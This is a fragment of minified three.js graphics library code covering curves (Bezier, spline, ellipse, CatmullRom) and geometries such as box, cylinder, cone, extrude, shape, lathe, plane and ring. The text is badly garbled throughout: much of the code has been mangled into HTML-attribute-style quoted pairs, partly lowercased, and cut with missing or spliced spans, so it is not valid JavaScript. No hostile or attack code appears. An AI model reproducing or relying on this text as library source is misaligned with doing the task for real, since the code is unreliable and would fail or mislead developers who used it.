l}});three.shape=\"function(){THREE.Path.apply(this,arguments);this.holes=[]};\" three.shape.prototype=\"Object.assign(Object.create(THREE.Path.prototype),{constructor:THREE.Shape,extrude:function(a){return\" new=\"\" three.extrudegeometry(this,a)},makegeometry:function(a){return=\"\" three.shapegeometry(this,a)},getpointsholes:function(a){for(var=\"\" b},extractallpoints:function(a){return{shape:this.getpoints(a),holes:this.getpointsholes(a)}},extractpoints:function(a){return=\"\" this.extractallpoints(a)}});=\"\" three.linecurve=\"function(a,b){this.v1=a;this.v2=b};THREE.LineCurve.prototype=Object.create(THREE.Curve.prototype);THREE.LineCurve.prototype.constructor=THREE.LineCurve;THREE.LineCurve.prototype.getPoint=function(a){var\" b};three.linecurve.prototype.getpointat=\"function(a){return\" this.getpoint(a)};three.linecurve.prototype.gettangent=\"function(a){return\" this.v2.clone().sub(this.v1).normalize()};=\"\" three.quadraticbeziercurve=\"function(a,b,c){this.v0=a;this.v1=b;this.v2=c};THREE.QuadraticBezierCurve.prototype=Object.create(THREE.Curve.prototype);THREE.QuadraticBezierCurve.prototype.constructor=THREE.QuadraticBezierCurve;THREE.QuadraticBezierCurve.prototype.getPoint=function(a){var\" three.vector2(b(a,this.v0.x,this.v1.x,this.v2.x),b(a,this.v0.y,this.v1.y,this.v2.y))};=\"\" three.quadraticbeziercurve.prototype.gettangent=\"function(a){var\" three.vector2(b(a,this.v0.x,this.v1.x,this.v2.x),b(a,this.v0.y,this.v1.y,this.v2.y))).normalize()};three.cubicbeziercurve=\"function(a,b,c,d){this.v0=a;this.v1=b;this.v2=c;this.v3=d};THREE.CubicBezierCurve.prototype=Object.create(THREE.Curve.prototype);THREE.CubicBezierCurve.prototype.constructor=THREE.CubicBezierCurve;\" three.cubicbeziercurve.prototype.getpoint=\"function(a){var\" three.vector2(b(a,this.v0.x,this.v1.x,this.v2.x,this.v3.x),b(a,this.v0.y,this.v1.y,this.v2.y,this.v3.y))};three.cubicbeziercurve.prototype.gettangent=\"function(a){var\" three.vector2(b(a,this.v0.x,this.v1.x,this.v2.x,this.v3.x),b(a,this.v0.y,this.v1.y,this.v2.y,this.v3.y))).normalize()};three.splinecurve=\"function(a){this.points=void\" three.splinecurve.prototype=\"Object.create(THREE.Curve.prototype);THREE.SplineCurve.prototype.constructor=THREE.SplineCurve;THREE.SplineCurve.prototype.getPoint=function(a){var\" c=\"Math.floor(a);a-=c;var\" d=\"b[0===c?c:c-1],e=b[c],f=b[c\">b.length-2?b.length-1:c+1],b=b[c>b.length-3?b.length-1:c+2],c=THREE.CurveUtils.interpolate;return new THREE.Vector2(c(d.x,e.x,f.x,b.x,a),c(d.y,e.y,f.y,b.y,a))};\nTHREE.EllipseCurve=function(a,b,c,d,e,f,g,h){this.aX=a;this.aY=b;this.xRadius=c;this.yRadius=d;this.aStartAngle=e;this.aEndAngle=f;this.aClockwise=g;this.aRotation=h||0};THREE.EllipseCurve.prototype=Object.create(THREE.Curve.prototype);THREE.EllipseCurve.prototype.constructor=THREE.EllipseCurve;\nTHREE.EllipseCurve.prototype.getPoint=function(a){var b=this.aEndAngle-this.aStartAngle;0>b&&(b+=2*Math.PI);b>2*Math.PI&&(b-=2*Math.PI);b=!0===this.aClockwise?this.aEndAngle+(1-a)*(2*Math.PI-b):this.aStartAngle+a*b;a=this.aX+this.xRadius*Math.cos(b);var c=this.aY+this.yRadius*Math.sin(b);if(0!==this.aRotation){var b=Math.cos(this.aRotation),d=Math.sin(this.aRotation),e=a;a=(e-this.aX)*b-(c-this.aY)*d+this.aX;c=(e-this.aX)*d+(c-this.aY)*b+this.aY}return new THREE.Vector2(a,c)};\nTHREE.ArcCurve=function(a,b,c,d,e,f){THREE.EllipseCurve.call(this,a,b,c,c,d,e,f)};THREE.ArcCurve.prototype=Object.create(THREE.EllipseCurve.prototype);THREE.ArcCurve.prototype.constructor=THREE.ArcCurve;THREE.LineCurve3=THREE.Curve.create(function(a,b){this.v1=a;this.v2=b},function(a){var b=new THREE.Vector3;b.subVectors(this.v2,this.v1);b.multiplyScalar(a);b.add(this.v1);return b});\nTHREE.QuadraticBezierCurve3=THREE.Curve.create(function(a,b,c){this.v0=a;this.v1=b;this.v2=c},function(a){var b=THREE.ShapeUtils.b2;return new THREE.Vector3(b(a,this.v0.x,this.v1.x,this.v2.x),b(a,this.v0.y,this.v1.y,this.v2.y),b(a,this.v0.z,this.v1.z,this.v2.z))});\nTHREE.CubicBezierCurve3=THREE.Curve.create(function(a,b,c,d){this.v0=a;this.v1=b;this.v2=c;this.v3=d},function(a){var b=THREE.ShapeUtils.b3;return new THREE.Vector3(b(a,this.v0.x,this.v1.x,this.v2.x,this.v3.x),b(a,this.v0.y,this.v1.y,this.v2.y,this.v3.y),b(a,this.v0.z,this.v1.z,this.v2.z,this.v3.z))});\nTHREE.SplineCurve3=THREE.Curve.create(function(a){console.warn(\"THREE.SplineCurve3 will be deprecated. Please use THREE.CatmullRomCurve3\");this.points=void 0==a?[]:a},function(a){var b=this.points;a*=b.length-1;var c=Math.floor(a);a-=c;var d=b[0==c?c:c-1],e=b[c],f=b[c>b.length-2?b.length-1:c+1],b=b[c>b.length-3?b.length-1:c+2],c=THREE.CurveUtils.interpolate;return new THREE.Vector3(c(d.x,e.x,f.x,b.x,a),c(d.y,e.y,f.y,b.y,a),c(d.z,e.z,f.z,b.z,a))});\nTHREE.CatmullRomCurve3=function(){function a(){}var b=new THREE.Vector3,c=new a,d=new a,e=new a;a.prototype.init=function(a,b,c,d){this.c0=a;this.c1=c;this.c2=-3*a+3*b-2*c-d;this.c3=2*a-2*b+c+d};a.prototype.initNonuniformCatmullRom=function(a,b,c,d,e,n,p){a=((b-a)/e-(c-a)/(e+n)+(c-b)/n)*n;d=((c-b)/n-(d-b)/(n+p)+(d-c)/p)*n;this.init(b,c,a,d)};a.prototype.initCatmullRom=function(a,b,c,d,e){this.init(b,c,e*(c-a),e*(d-b))};a.prototype.calc=function(a){var b=a*a;return this.c0+this.c1*a+this.c2*b+this.c3*\nb*a};return THREE.Curve.create(function(a){this.points=a||[];this.closed=!1},function(a){var g=this.points,h,k;k=g.length;2>k&&console.log(\"duh, you need at least 2 points\");a*=k-(this.closed?0:1);h=Math.floor(a);a-=h;this.closed?h+=0<h?0:(math.floor(math.abs(h) 0=\"==\" g.length)+1)*g.length:0=\"==a&&h===k-1&&(h=k-2,a=1);var\" l,n,p;this.closed||0<h?l=\"g[(h-1)%k]:(b.subVectors(g[0],g[1]).add(g[0]),l=b);n=g[h%k];p=g[(h+1)%k];this.closed||h+2<k?g=g[(h+2)%k]:(b.subVectors(g[k-1],g[k-2]).add(g[k-1]),g=b);if(void\" this.type||\"centripetal\"=\"==this.type||\"chordal\"===this.type){var\" m=\"chordal\" ==\"=this.type?.5:.25;k=Math.pow(l.distanceToSquared(n),m);h=Math.pow(n.distanceToSquared(p),m);m=Math.pow(p.distanceToSquared(g),m);1E-4\">h&&(h=1);1E-4>k&&(k=h);1E-4>m&&(m=h);c.initNonuniformCatmullRom(l.x,n.x,p.x,g.x,k,h,m);d.initNonuniformCatmullRom(l.y,n.y,p.y,g.y,k,h,m);e.initNonuniformCatmullRom(l.z,n.z,p.z,g.z,k,h,m)}else\"catmullrom\"===this.type&&(k=void 0!==this.tension?this.tension:.5,c.initCatmullRom(l.x,n.x,p.x,g.x,\nk),d.initCatmullRom(l.y,n.y,p.y,g.y,k),e.initCatmullRom(l.z,n.z,p.z,g.z,k));return new THREE.Vector3(c.calc(a),d.calc(a),e.calc(a))})}();THREE.ClosedSplineCurve3=function(a){console.warn(\"THREE.ClosedSplineCurve3 has been deprecated. Please use THREE.CatmullRomCurve3.\");THREE.CatmullRomCurve3.call(this,a);this.type=\"catmullrom\";this.closed=!0};THREE.ClosedSplineCurve3.prototype=Object.create(THREE.CatmullRomCurve3.prototype);\nTHREE.BoxGeometry=function(a,b,c,d,e,f){THREE.Geometry.call(this);this.type=\"BoxGeometry\";this.parameters={width:a,height:b,depth:c,widthSegments:d,heightSegments:e,depthSegments:f};this.fromBufferGeometry(new THREE.BoxBufferGeometry(a,b,c,d,e,f));this.mergeVertices()};THREE.BoxGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.BoxGeometry.prototype.constructor=THREE.BoxGeometry;THREE.CubeGeometry=THREE.BoxGeometry;\nTHREE.BoxBufferGeometry=function(a,b,c,d,e,f){function g(a,b,c,d,e,f,g,k,l,K,P){var M=f/l,H=g/K,L=f/2,O=g/2,N=k/2;g=l+1;for(var Q=K+1,J=f=0,D=new THREE.Vector3,G=0;G<q;g++)for(var aa=\"G*H-O,T=0;T<g;T++)D[a]=(T*M-L)*d,D[b]=aa*e,D[c]=N,p[r]=D.x,p[r+1]=D.y,p[r+2]=D.z,D[a]=0,D[b]=0,D[c]=0<k?1:-1,m[r]=D.x,m[r+1]=D.y,m[r+2]=D.z,q[s]=T/l,q[s+1]=1-G/K,r+=3,s+=2,f+=1;for(G=0;G<K;G++)for(T=0;T<l;T++)a=u+T+g*(G+1),b=u+(T+1)+g*(G+1),c=u+(T+1)+g*G,n[t]=u+T+g*G,n[t+1]=a,n[t+2]=c,n[t+3]=a,n[t+4]=b,n[t+5]=c,t+=6,\" j+=\"6;h.addGroup(v,J,P);v+=J;u+=f}THREE.BufferGeometry.call(this);this.type=\"BoxBufferGeometry\";this.parameters={width:a,height:b,depth:c,widthSegments:d,heightSegments:e,depthSegments:f};var\" h=\"this;d=Math.floor(d)||1;e=Math.floor(e)||1;f=Math.floor(f)||1;var\" k=\"function(a,b,c){a=0+(a+1)*(b+1)*2+(a+1)*(c+1)*2;return\" a+=\"(c+1)*(b+1)*2}(d,e,f),l=function(a,b,c){a=0+a*b*2+a*c*2;a+=c*b*2;return\" 6*a}(d,e,f),n=\"new\" (65535<l?uint32array:uint16array)(l),p=\"new\" float32array(3*k),m=\"new\" float32array(3*k),q=\"new\" float32array(2*=\"\" k),r=\"0,s=0,t=0,u=0,v=0;g(\"z\",\"y\",\"x\",-1,-1,c,b,a,f,e,0);g(\"z\",\"y\",\"x\",1,-1,c,b,-a,f,e,1);g(\"x\",\"z\",\"y\",1,1,a,c,b,d,f,2);g(\"x\",\"z\",\"y\",1,-1,a,c,-b,d,f,3);g(\"x\",\"y\",\"z\",1,-1,a,b,c,d,e,4);g(\"x\",\"y\",\"z\",-1,-1,a,b,-c,d,e,5);this.setIndex(new\" three.bufferattribute(n,1));this.addattribute(\"position\",new=\"\" three.bufferattribute(p,3));this.addattribute(\"normal\",new=\"\" three.bufferattribute(m,3));this.addattribute(\"uv\",new=\"\" three.bufferattribute(q,2))};three.boxbuffergeometry.prototype=\"Object.create(THREE.BufferGeometry.prototype);\" three.boxbuffergeometry.prototype.constructor=\"THREE.BoxBufferGeometry;THREE.CircleGeometry=function(a,b,c,d){THREE.Geometry.call(this);this.type=\"CircleGeometry\";this.parameters={radius:a,segments:b,thetaStart:c,thetaLength:d};this.fromBufferGeometry(new\" three.circlebuffergeometry(a,b,c,d))};three.circlegeometry.prototype=\"Object.create(THREE.Geometry.prototype);THREE.CircleGeometry.prototype.constructor=THREE.CircleGeometry;\" three.circlebuffergeometry=\"function(a,b,c,d){THREE.BufferGeometry.call(this);this.type=\"CircleBufferGeometry\";this.parameters={radius:a,segments:b,thetaStart:c,thetaLength:d};a=a||50;b=void\" 0!=\"=b?Math.max(3,b):8;c=void\" e=\"b+2,f=new\" float32array(3*e),g=\"new\" float32array(3*e),e=\"new\" float32array(2*e);g[2]=\"1;e[0]=.5;e[1]=.5;for(var\" n=\"c+h/b*d;f[k]=a*Math.cos(n);f[k+1]=a*Math.sin(n);g[k+2]=1;e[l]=(f[k]/a+1)/2;e[l+1]=(f[k+1]/a+1)/2}c=\" [];for(k=\"1;k<=b;k++)c.push(k,k+1,0);this.setIndex(new\" three.bufferattribute(new=\"\" uint16array(c),1));this.addattribute(\"position\",new=\"\" three.bufferattribute(f,3));this.addattribute(\"normal\",new=\"\" three.bufferattribute(g,3));this.addattribute(\"uv\",new=\"\" three.bufferattribute(e,2));this.boundingsphere=\"new\" three.sphere(new=\"\" three.vector3,a)};three.circlebuffergeometry.prototype=\"Object.create(THREE.BufferGeometry.prototype);THREE.CircleBufferGeometry.prototype.constructor=THREE.CircleBufferGeometry;\" three.cylinderbuffergeometry=\"function(a,b,c,d,e,f,g,h){function\" k(c){var=\"\" e,f,k,m=\"new\" three.vector2,n=\"new\" three.vector3,p=\"0,C=!0===c?a:b,M=!0===c?1:-1;f=u;for(e=1;e<=d;e++)r.setXYZ(u,0,w*M,0),s.setXYZ(u,0,M,0),m.x=.5,m.y=.5,t.setXY(u,m.x,m.y),u++;k=u;for(e=0;e<=d;e++){var\" n+1),v++,q.setx(v,n)),v++,q.setx(v,m),v++,p+=\"3;l.addGroup(E,p,!0===c?1:2);E+=p}THREE.BufferGeometry.call(this);this.type=\"CylinderBufferGeometry\";this.parameters={radiusTop:a,radiusBottom:b,height:c,radialSegments:d,heightSegments:e,openEnded:f,thetaStart:g,thetaLength:h};var\" l=\"this;a=void\" p=\"function(){var\" a=\"(d+1)*\" (e+1);!1=\"==f&&(a+=(d+1)*n+d*n);return\" a}(),m=\"function(){var\" a}(),q=\"new\" (65535<m?uint32array:uint16array)(m),1),r=\"new\" float32array(3*p),3),s=\"new\" float32array(3*p),3),t=\"new\" float32array(2*p),2),u=\"0,v=0,C=[],w=c/2,E=0;(function(){var\" f,k,m=\"new\" three.vector3,n=\"new\" m*math.sin(h*h+g);n.y=\"-P*c+w;n.z=M*Math.cos(H*h+g);r.setXYZ(u,n.x,n.y,n.z);m.copy(n);if(0===a&&0===k||0===b&&k===e)m.x=Math.sin(H*h+g),m.z=Math.cos(H*h+g);m.setY(Math.sqrt(m.x*m.x+m.z*m.z)*F).normalize();s.setXYZ(u,m.x,m.y,m.z);t.setXY(u,H,1-P);K.push(u);u++}C.push(K)}for(f=0;f<d;f++)for(k=0;k<e;k++)m=C[k+1][f],n=C[k+1][f+1],F=C[k][f+1],q.setX(v,C[k][f]),v++,q.setX(v,m),v++,q.setX(v,F),v++,q.setX(v,m),v++,q.setX(v,n),v++,q.setX(v,F),v++,p+=6;l.addGroup(E,p,0);E+=p})();!1===f&&(0<a&&k(!0),0<b&&k(!1));\" this.setindex(q);this.addattribute(\"position\",r);this.addattribute(\"normal\",s);this.addattribute(\"uv\",t)};three.cylinderbuffergeometry.prototype=\"Object.create(THREE.BufferGeometry.prototype);THREE.CylinderBufferGeometry.prototype.constructor=THREE.CylinderBufferGeometry;\" three.cylindergeometry=\"function(a,b,c,d,e,f,g,h){THREE.Geometry.call(this);this.type=\"CylinderGeometry\";this.parameters={radiusTop:a,radiusBottom:b,height:c,radialSegments:d,heightSegments:e,openEnded:f,thetaStart:g,thetaLength:h};this.fromBufferGeometry(new\" three.cylinderbuffergeometry(a,b,c,d,e,f,g,h));this.mergevertices()};three.cylindergeometry.prototype=\"Object.create(THREE.Geometry.prototype);THREE.CylinderGeometry.prototype.constructor=THREE.CylinderGeometry;\" three.conebuffergeometry=\"function(a,b,c,d,e,f,g){THREE.CylinderBufferGeometry.call(this,0,a,b,c,d,e,f,g);this.type=\"ConeBufferGeometry\";this.parameters={radius:a,height:b,radialSegments:c,heightSegments:d,thetaStart:f,thetaLength:g}};THREE.ConeBufferGeometry.prototype=Object.create(THREE.BufferGeometry.prototype);THREE.ConeBufferGeometry.prototype.constructor=THREE.ConeBufferGeometry;\" three.conegeometry=\"function(a,b,c,d,e,f,g){THREE.CylinderGeometry.call(this,0,a,b,c,d,e,f,g);this.type=\"ConeGeometry\";this.parameters={radius:a,height:b,radialSegments:c,heightSegments:d,openEnded:e,thetaStart:f,thetaLength:g}};THREE.ConeGeometry.prototype=Object.create(THREE.CylinderGeometry.prototype);THREE.ConeGeometry.prototype.constructor=THREE.ConeGeometry;\" three.edgesgeometry=\"function(a,b){function\" c(a,b){return=\"\" a-b}three.buffergeometry.call(this);var=\"\" d=\"Math.cos(THREE.Math.DEG2RAD*(void\" instanceof=\"\" three.buffergeometry?(h=\"new\" three.geometry,h.frombuffergeometry(a)):h=\"a.clone();h.mergeVertices();h.computeFaceNormals();var\">m;m++){e[0]=p[g[m]];e[1]=p[g[(m+1)%3]];e.sort(c);var q=e.toString();void 0===f[q]?f[q]={vert1:e[0],vert2:e[1],face1:l,\nface2:void 0}:f[q].face2=l}e=[];for(q in f)if(g=f[q],void 0===g.face2||h[g.face1].normal.dot(h[g.face2].normal)<=d)l=k[g.vert1],e.push(l.x),e.push(l.y),e.push(l.z),l=k[g.vert2],e.push(l.x),e.push(l.y),e.push(l.z);this.addattribute(\"position\",new three.bufferattribute(new=\"\" float32array(e),3))};three.edgesgeometry.prototype=\"Object.create(THREE.BufferGeometry.prototype);THREE.EdgesGeometry.prototype.constructor=THREE.EdgesGeometry;\" three.extrudegeometry=\"function(a,b){\"undefined\"!==typeof\" a&&(three.geometry.call(this),this.type=\"ExtrudeGeometry\" ,a=\"Array.isArray(a)?a:[a],this.addShapeList(a,b),this.computeFaceNormals())};THREE.ExtrudeGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.ExtrudeGeometry.prototype.constructor=THREE.ExtrudeGeometry;THREE.ExtrudeGeometry.prototype.addShapeList=function(a,b){for(var\" c=\"a.length,d=0;d<c;d++)this.addShape(a[d],b)};\" three.extrudegeometry.prototype.addshape=\"function(a,b){function\" c(a,b,c){b||console.error(\"three.extrudegeometry:=\"\" vec=\"\" does=\"\" not=\"\" exist\");return=\"\" b.clone().multiplyscalar(c).add(a)}function=\"\" d(a,b,c){var=\"\" d=\"1,d=a.x-b.x,e=a.y-b.y,f=c.x-a.x,g=c.y-a.y,h=d*d+e*e;if(Math.abs(d*g-e*f)\">Number.EPSILON){var k=Math.sqrt(h),l=Math.sqrt(f*f+g*g),h=b.x-e/k;b=b.y+d/k;f=((c.x-g/l-h)*g-(c.y+f/l-b)*f)/(d*g-e*f);c=h+d*f-a.x;a=b+e*f-a.y;d=c*c+a*a;if(2>=d)return new THREE.Vector2(c,a);d=Math.sqrt(d/2)}else a=!1,d>Number.EPSILON?\nf>Number.EPSILON&&(a=!0):d<-number.epsilon?f<-number.epsilon&&(a=!0):math.sign(e)===math.sign(g)&&(a=!0),a?(c=-e,a=d,d=math.sqrt(h)):(c=d,a=e,d=math.sqrt(h 2));return=\"\" new=\"\" three.vector2(c=\"\" d,a=\"\" d)}function=\"\" e(a,b){var=\"\" c,d;for(g=\"a.length;0<=--G;){c=G;d=G-1;0\">d&&(d=a.length-1);for(var e=0,f=q+2*n,e=0;e<f;e++){var g=\"Q*e,h=Q*(e+1),k=b+c+g,g=b+d+g,l=b+d+h,h=b+c+h,k=k+B,g=g+B,l=l+B,h=h+B;I.faces.push(new\" three.face3(k,g,h,null,null,1));i.faces.push(new=\"\" three.face3(g,l,h,null,null,1));k=\"u.generateSideWallUV(I,\" k,g,l,h);i.facevertexuvs[0].push([k[0],k[1],k[3]]);i.facevertexuvs[0].push([k[1],k[2],k[3]])}}}function=\"\" f(a,b,c){i.vertices.push(new=\"\" three.vector3(a,b,c))}function=\"\" g(a,b,c){a+=\"B;b+=B;c+=B;I.faces.push(new\" three.face3(a,b,c,null,null,0));a=\"u.generateTopUV(I,a,b,c);I.faceVertexUvs[0].push(a)}var\" h=\"void\" 0!=\"=b.amount?b.amount:100,k=void\" m=\"void\" three.tubegeometry.frenetframes(r,q,!1),c=\"new\" three.vector3,w=\"new\" three.vector3,e=\"new\" three.vector3);p||(l=\"k=n=0);var\" z,y,a,i=\"this,B=this.vertices.length,r=a.extractPoints(m),m=r.shape,F=r.holes;if(r=!THREE.ShapeUtils.isClockWise(m)){m=m.reverse();\" y=\"0;for(A=F.length;y<A;y++)z=F[y],THREE.ShapeUtils.isClockWise(z)&&(F[y]=z.reverse());r=!1}var\" k=\"THREE.ShapeUtils.triangulateShape(m,F),P=m;y=0;for(A=F.length;y<A;y++)z=F[y],m=m.concat(z);var\" m,h,l,o,n,q=\"m.length,J,D=K.length,r=[],G=0;L=P.length;M=L-1;for(H=G+1;G<L;G++,M++,H++)M===L&&(M=0),H===L&&(H=0),r[G]=d(P[G],P[M],P[H]);var\" aa=\"[],T,X=r.concat();y=0;for(A=F.length;y<A;y++){z=F[y];T=[];G=0;L=z.length;M=L-1;for(H=G+1;G<L;G++,M++,H++)M===L&&(M=0),H===L&&(H=0),T[G]=d(z[G],z[M],z[H]);aa.push(T);X=\" x.concat(t)}for(m=\"0;M<n;M++){L=M/n;O=k*(1-L);H=l*Math.sin(L*Math.PI/2);G=0;for(L=P.length;G<L;G++)N=c(P[G],r[G],H),f(N.x,N.y,-O);y=0;for(A=F.length;y<A;y++)for(z=F[y],T=aa[y],G=0,L=z.length;G<L;G++)N=c(z[G],T[G],H),f(N.x,N.y,-O)}H=l;for(G=0;G<Q;G++)N=p?c(m[G],X[G],H):m[G],t?(w.copy(v.normals[0]).multiplyScalar(N.x),C.copy(v.binormals[0]).multiplyScalar(N.y),E.copy(s[0]).add(w).add(C),f(E.x,E.y,E.z)):f(N.x,N.y,0);for(L=1;L<=q;L++)for(G=0;G<Q;G++)N=p?c(m[G],X[G],H):m[G],t?(w.copy(v.normals[L]).multiplyScalar(N.x),\" c.copy(v.binormals[l]).multiplyscalar(n.y),e.copy(s[l]).add(w).add(c),f(e.x,e.y,e.z)):f(n.x,n.y,h=\"\" q*l);for(m=\"n-1;0<=M;M--){L=M/n;O=k*(1-L);H=l*Math.sin(L*Math.PI/2);G=0;for(L=P.length;G<L;G++)N=c(P[G],r[G],H),f(N.x,N.y,h+O);y=0;for(A=F.length;y<A;y++)for(z=F[y],T=aa[y],G=0,L=z.length;G<L;G++)N=c(z[G],T[G],H),t?f(N.x,N.y+s[q-1].y,s[q-1].x+O):f(N.x,N.y,h+O)}(function(){if(p){var\" a;a=\"0*Q;for(G=0;G<D;G++)J=K[G],g(J[2]+a,J[1]+a,J[0]+a);a=q+2*n;a*=Q;for(G=0;G<D;G++)J=K[G],g(J[0]+a,J[1]+a,J[2]+a)}else{for(G=\" 0;g<d;g++)j=\"K[G],g(J[2],J[1],J[0]);for(G=0;G<D;G++)J=K[G],g(J[0]+Q*q,J[1]+Q*q,J[2]+Q*q)}})();(function(){var\" a=\"0;e(P,a);a+=P.length;y=0;for(A=F.length;y<A;y++)z=F[y],e(z,a),a+=z.length})()};\" three.extrudegeometry.worlduvgenerator=\"{generateTopUV:function(a,b,c,d){a=a.vertices;b=a[b];c=a[c];d=a[d];return[new\" three.vector2(b.x,b.y),new=\"\" three.vector2(c.x,c.y),new=\"\" three.vector2(d.x,d.y)]},generatesidewalluv:function(a,b,c,d,e){a=\"a.vertices;b=a[b];c=a[c];d=a[d];e=a[e];return.01\">Math.abs(b.y-c.y)?[new THREE.Vector2(b.x,1-b.z),new THREE.Vector2(c.x,1-c.z),new THREE.Vector2(d.x,1-d.z),new THREE.Vector2(e.x,1-e.z)]:[new THREE.Vector2(b.y,1-b.z),new THREE.Vector2(c.y,1-c.z),new THREE.Vector2(d.y,\n1-d.z),new THREE.Vector2(e.y,1-e.z)]}};THREE.ShapeGeometry=function(a,b){THREE.Geometry.call(this);this.type=\"ShapeGeometry\";!1===Array.isArray(a)&&(a=[a]);this.addShapeList(a,b);this.computeFaceNormals()};THREE.ShapeGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.ShapeGeometry.prototype.constructor=THREE.ShapeGeometry;THREE.ShapeGeometry.prototype.addShapeList=function(a,b){for(var c=0,d=a.length;c<d;c++)this.addshape(a[c],b);return 0=\"==b&&(b={});var\" this};=\"\" three.shapegeometry.prototype.addshape=\"function(a,b){void\" c=\"b.material,d=void\" 0!=\"=b.curveSegments?b.curveSegments:12);var\" k=\"e.shape,l=e.holes;if(!THREE.ShapeUtils.isClockWise(k))for(k=k.reverse(),e=0,f=l.length;e<f;e++)g=l[e],THREE.ShapeUtils.isClockWise(g)&&(l[e]=g.reverse());var\" n=\"THREE.ShapeUtils.triangulateShape(k,l);e=0;for(f=l.length;e<f;e++)g=l[e],k=k.concat(g);\" l=\"k.length;f=n.length;for(e=0;e<l;e++)g=k[e],this.vertices.push(new\" three.vector3(g.x,g.y,0));for(e=\"0;e<f;e++)l=n[e],k=l[0]+h,g=l[1]+h,l=l[2]+h,this.faces.push(new\" three.face3(k,g,l,null,null,c)),this.facevertexuvs[0].push(d.generatetopuv(this,k,g,l))};=\"\" three.lathebuffergeometry=\"function(a,b,c,d){THREE.BufferGeometry.call(this);this.type=\"LatheBufferGeometry\";this.parameters={points:a,segments:b,phiStart:c,phiLength:d};b=Math.floor(b)||12;c=c||0;d=d||2*Math.PI;d=THREE.Math.clamp(d,0,2*Math.PI);for(var\" e=\"(b+1)*a.length,f=b*a.length*6,g=new\" three.bufferattribute(new=\"\" (65535<f?uint32array:uint16array)(f),1),h=\"new\" float32array(3*e),3),k=\"new\" float32array(2*e),2),l=\"0,n=0,p=1/b,m=new\" three.vector3,q=\"new\" three.vector2,=\"\" f=\"c+e*p*d,r=Math.sin(f),s=Math.cos(f),f=0;f<=a.length-1;f++)m.x=a[f].x*r,m.y=a[f].y,m.z=a[f].x*s,h.setXYZ(l,m.x,m.y,m.z),q.x=e/b,q.y=f/(a.length-1),k.setXY(l,q.x,q.y),l++;for(e=0;e<b;e++)for(f=0;f<a.length-1;f++)c=f+e*a.length,l=c+a.length,p=c+a.length+1,m=c+1,g.setX(n,c),n++,g.setX(n,l),n++,g.setX(n,m),n++,g.setX(n,l),n++,g.setX(n,p),n++,g.setX(n,m),n++;this.setIndex(g);this.addAttribute(\"position\",h);this.addAttribute(\"uv\",k);this.computeVertexNormals();if(d===2*Math.PI)for(d=\" this.attributes.normal.array,g=\"new\" three.vector3,h=\"new\" three.vector3,k=\"new\" three.vector3,c=\"b*a.length*3,f=e=0;e<a.length;e++,f+=3)g.x=d[f+0],g.y=d[f+1],g.z=d[f+2],h.x=d[c+f+0],h.y=d[c+f+1],h.z=d[c+f+2],k.addVectors(g,h).normalize(),d[f+0]=d[c+f+0]=k.x,d[f+1]=d[c+f+1]=k.y,d[f+2]=d[c+f+2]=k.z};THREE.LatheBufferGeometry.prototype=Object.create(THREE.BufferGeometry.prototype);THREE.LatheBufferGeometry.prototype.constructor=THREE.LatheBufferGeometry;\" three.lathegeometry=\"function(a,b,c,d){THREE.Geometry.call(this);this.type=\"LatheGeometry\";this.parameters={points:a,segments:b,phiStart:c,phiLength:d};this.fromBufferGeometry(new\" three.lathebuffergeometry(a,b,c,d));this.mergevertices()};three.lathegeometry.prototype=\"Object.create(THREE.Geometry.prototype);THREE.LatheGeometry.prototype.constructor=THREE.LatheGeometry;\" three.planegeometry=\"function(a,b,c,d){THREE.Geometry.call(this);this.type=\"PlaneGeometry\";this.parameters={width:a,height:b,widthSegments:c,heightSegments:d};this.fromBufferGeometry(new\" three.planebuffergeometry(a,b,c,d))};three.planegeometry.prototype=\"Object.create(THREE.Geometry.prototype);THREE.PlaneGeometry.prototype.constructor=THREE.PlaneGeometry;\" three.planebuffergeometry=\"function(a,b,c,d){THREE.BufferGeometry.call(this);this.type=\"PlaneBufferGeometry\";this.parameters={width:a,height:b,widthSegments:c,heightSegments:d};var\" g=\"c+1,h=d+1,k=a/c,l=b/d;b=new\" float32array(g*h*3);a=\"new\" float32array(g*h*3);for(var=\"\" float32array(g*h*2),p=\"0,m=0,q=0;q<h;q++)for(var\" r=\"q*l-f,s=0;s<g;s++)b[p]=s*k-e,b[p+1]=-r,a[p+2]=1,n[m]=s/c,n[m+1]=1-q/d,p+=3,m+=2;p=0;e=new\" (65535<b.length=\"\" 3?uint32array:uint16array)(c*=\"\" d*6);for(q=\"0;q<d;q++)for(s=0;s<c;s++)f=s+g*(q+1),h=s+1+g*(q+1),k=s+1+g*q,e[p]=s+g*q,e[p+1]=f,e[p+2]=k,e[p+3]=f,e[p+4]=h,e[p+5]=k,p+=6;this.setIndex(new\" three.bufferattribute(e,1));this.addattribute(\"position\",new=\"\" three.bufferattribute(b,3));this.addattribute(\"normal\",new=\"\" three.bufferattribute(a,3));this.addattribute(\"uv\",new=\"\" three.bufferattribute(n,2))};three.planebuffergeometry.prototype=\"Object.create(THREE.BufferGeometry.prototype);THREE.PlaneBufferGeometry.prototype.constructor=THREE.PlaneBufferGeometry;\" three.ringbuffergeometry=\"function(a,b,c,d,e,f){THREE.BufferGeometry.call(this);this.type=\"RingBufferGeometry\";this.parameters={innerRadius:a,outerRadius:b,thetaSegments:c,phiSegments:d,thetaStart:e,thetaLength:f};a=a||20;b=b||50;e=void\" (65535<h?uint32array:uint16array)(h),1),k=\"new\" float32array(3*g),3),l=\"new\" float32array(3*=\"\" g),3),g=\"new\" float32array(2*g),2),n=\"0,p=0,m,q=a,r=(b-a)/d,s=new\" three.vector3,t=\"new\" three.vector2,u;for(a=\"0;a<=d;a++){for(u=0;u<=c;u++)m=e+u/c*f,s.x=q*Math.cos(m),s.y=q*Math.sin(m),k.setXYZ(n,s.x,s.y,s.z),l.setXYZ(n,0,0,1),t.x=(s.x/b+1)/2,t.y=(s.y/b+1)/2,g.setXY(n,t.x,t.y),n++;q+=r}for(a=0;a<d;a++)for(b=a*(c+1),u=0;u<c;u++)e=m=u+b,f=m+c+1,n=m+c+2,m+=1,h.setX(p,e),p++,h.setX(p,f),p++,h.setX(p,n),p++,h.setX(p,e),p++,h.setX(p,n),p++,h.setX(p,m),p++;this.setIndex(h);this.addAttribute(\"position\",\" 